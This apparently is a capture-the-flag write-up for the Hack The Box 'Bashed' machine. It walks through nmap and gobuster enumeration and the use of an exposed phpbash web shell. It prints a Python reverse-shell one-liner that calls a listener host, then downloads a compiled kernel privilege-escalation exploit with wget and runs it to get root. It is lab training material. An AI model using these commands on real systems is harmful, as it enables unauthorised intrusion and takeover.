# htb-bashed
This is my [Hack the box](https://www.hackthebox.eu/)'s Bashed machine write-up.

## Machine
OS: Linux

IP: 10.10.10.68

Difficulty: Easy

## Initial enumeration
[Nmap](https://github.com/nmap/nmap) scan on the target:

`nmap -sV -sC -oN bashed.nmap $BASHED`

Flags:
 - `-sV`: Version detection
 - `-sC`: Script scan using the default set of scripts
 - `-oN`: Output in normal nmap format

```
root@kali:/home/kali# nmap -sC -sV -Pn -oN bashed.nmap $BASHED
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 20:01 EDT
Nmap scan report for 10.10.10.68 (10.10.10.68)
Host is up (0.23s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

There's a web server running on port 80. Get paths using gobuster:
```
root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --url http://10.10.10.68 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.68
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/26 20:26:58 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/dev (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
/php (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
===============================================================
2020/08/26 20:30:57 Finished
===============================================================
```

The page on port 80 advertises a web shell: [phpbash](https://github.com/Arrexel/phpbash). It mentions the tool was built on this server which makes us think it could be accessible. `/dev/phpbash.php` is its location.

Get some situational awareness information using the shell:
```
www-data@bashed:/var/www/html/dev# uname -a
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

www-data@bashed:/var/www/html/dev# whoami
www-data

www-data@bashed:/var/www/html/dev# env
OLDPWD=/var/www/html/dev
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/var/www/html/dev


www-data@bashed:/var/www/html/dev# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

It is possible already to grab the user flag from `home/arrexel`: `cat /home/arrexel/user.txt`

Check that Python is installed by executing `python --version`. Let's trigger a reverse shell using it.

First, let's set up the listener on the attacker machine:
```bash
sudo nc -lvp 8888 
```

Then, with a little help from the pentestmonkey's [reverse shell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), hit the listener from the phpbash web interface (replace IP and port by the listener's):
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

It pops a shell on the listener!

The kernel version can be obtained by executing `uname -a` is 4.4.0-62-generic.

Let's check on searchsploit if that version of Linux kernel is vulnerable:
```
$ searchsploit 4.4.0
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Comodo Backup 4.4.0.0 - Null Pointer Dereference Privilege Escalation              | windows/local/35905.c
eTouch SamePage 4.4.0.0.239 - Multiple Vulnerabilities                             | php/webapps/36089.txt
Foxit MobilePDF 4.4.0 iOS - Multiple Vulnerabilities                               | ios/webapps/35775.txt
Helpdesk Pilot Knowledge Base 4.4.0 - SQL Injection                                | php/webapps/10788.txt
Linux 4.4.0 < 4.4.0-53 - 'AF_PACKET chocobo_root' Local Privilege Escalation (Meta | linux/local/44696.rb
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privil | linux_x86-64/local/40871.c
Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free (PoC)                               | linux/dos/41457.c
Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation                | linux/local/41458.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds P | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Co | linux/local/47170.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation             | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privi | linux/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escala | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Lo | linux/local/47169.c
Photo Manager Pro 4.4.0 iOS - Code Execution                                       | ios/webapps/36798.txt
Photo Manager Pro 4.4.0 iOS - Local File Inclusion                                 | ios/webapps/36796.txt
PHP 4.4.0 - 'mysql_connect function' Local Buffer Overflow                         | windows/local/1406.php
Vembu Storegrid Web Interface 4.4.0 - Multiple Vulnerabilities                     | php/webapps/46549.txt
----------------------------------------------------------------------------------- ---------------------------------
```

For this example this one will be used: `Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation`. Compile it on Kali (attacker) and expose it through an HTTP server for it to be available to the victim:
```
$ locate linux/local/44298.c
/usr/share/exploitdb/exploits/linux/local/44298.c
$ gcc -o privesc /usr/share/exploitdb/exploits/linux/local/44298.c
$ ls
privesc
$ python -m SimpleHTTPServer
```

And then, from the shell on the victim, get it and execute it:
```
$ sudo -l 
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
$ sudo -u scriptmanager /bin/bash
python -c 'import pty; pty.spawn("/bin/bash")'
scriptmanager@bashed:/var/www/html/uploads$ cd  
cd
scriptmanager@bashed:~$ pwd
pwd
/home/scriptmanager
scriptmanager@bashed:~$ wget 10.10.14.13:8000/privesc
wget 10.10.14.13:8000/privesc
--2020-09-04 21:52:11--  http://10.10.14.13:8000/privesc
Connecting to 10.10.14.13:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17880 (17K) [application/octet-stream]
Saving to: 'privesc'

privesc             100%[===================>]  17.46K  28.8KB/s    in 0.6s    

2020-09-04 21:52:13 (28.8 KB/s) - 'privesc' saved [17880/17880]

scriptmanager@bashed:~$ chmod +x privesc
chmod +x privesc
scriptmanager@bashed:~$ ./privesc
./privesc
task_struct = ffff88003ab93800
uidptr = ffff880038719204
spawning root shell
root@bashed:~# whoami
whoami
root
root@bashed:~# 
```

Note the execution of the exploit was done as `scriptmanager` and not as `www-data` (leveraging the fact that `www-data` has permissions to execute anything as `scriptmanager`). This was simply because the same process didn't work when executing it as `www-data`.
